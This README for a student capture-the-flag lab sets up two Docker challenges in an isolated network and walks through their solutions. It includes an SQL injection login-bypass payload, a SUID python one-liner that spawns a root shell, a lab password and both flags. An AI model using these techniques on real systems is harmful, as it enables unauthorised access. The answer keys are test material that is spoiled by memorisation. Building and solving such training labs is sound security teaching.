# CyberVault — Member 4 Deliverables (CV-03 & CV-06)

Everything here runs on the **Ubuntu CTF Server**, inside the **isolated
Host-Only network**. You attack it from **Kali Linux**. Never expose these
ports outside the isolated network.

## 1. Copy files to the Ubuntu CTF Server

From your host machine (or directly if you built these on the Ubuntu VM):

```bash
scp -r cybervault/ ctfadmin@<ubuntu-ctf-server-ip>:~/cybervault/
```

## 2. Install Docker (on the Ubuntu server, one-time setup)

```bash
sudo apt update
sudo apt install -y docker.io docker-compose-plugin
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # log out/in after this
```

## 3. Build and start both challenges

```bash
cd ~/cybervault
docker compose up -d --build
```

Check they're running:
```bash
docker ps
```
You should see `cv03-web-gateway` (port 5000) and `cv06-final-server` (port 2222→22).

## 4. Solve CV-03 (do this from Kali, to generate your Burp/screenshot evidence)

1. Browse to `http://<ubuntu-server-ip>:5000` — you'll see the NexaCore login page.
2. Try a normal login → fails.
3. In the **username** field enter:
   ```
   admin' --
   ```
   Leave password blank or anything. This closes the SQL string and comments
   out the password check.
4. You're redirected to `/dashboard`, which shows the flag:
   ```
   CV{web_gateway_sqli_bypass_success}
   ```
5. Capture in Burp Suite: the raw POST request with the payload, and the
   dashboard response — this is your evidence screenshot.

## 5. Solve CV-06 (from Kali)

1. SSH in as the low-privileged account:
   ```bash
   ssh analyst@<ubuntu-server-ip> -p 2222
   # password: CyberVault2026
   ```
2. Check current privileges:
   ```bash
   id
   whoami
   ```
3. Enumerate SUID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   You'll spot `/usr/bin/python3.10` with the SUID bit set — unusual and
   exploitable (this is a documented GTFOBins technique).
4. Escalate to root:
   ```bash
   /usr/bin/python3.10 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
   ```
5. Confirm root and read the flag:
   ```bash
   id
   cat /root/flag.txt
   ```
   Output:
   ```
   CV{final_server_suid_python_root_shell}
   ```
6. Screenshot the `id` before/after and the `cat /root/flag.txt` output.

## 6. Reset / recovery (after each participant or test run)

```bash
cd ~/cybervault
docker compose down
docker compose up -d --build
```
This destroys both containers and rebuilds them clean from the Dockerfiles —
no leftover state, sessions, or changes carry over to the next student.

## 7. Isolation check (for Appendix E testing evidence)

From inside either container, confirm no outbound reach beyond the isolated
network:
```bash
docker exec -it cv06-final-server bash -c "curl -m 3 https://google.com || echo BLOCKED"
```
On the real deployment this must be run with the containers attached only to
the VirtualBox Host-Only network, not a NAT/bridge with internet access —
adjust `docker-compose.yml` networking or firewall rules on the Ubuntu host
accordingly before final testing.

## Files in this package

```
cybervault/
├── docker-compose.yml
├── cv03-web-gateway/
│   ├── Dockerfile
│   └── app.py          (Flask app, SQLi login bypass, flag on /dashboard)
└── cv06-final-server/
    └── Dockerfile       (Ubuntu image, SUID python3 misconfig, /root/flag.txt)
```
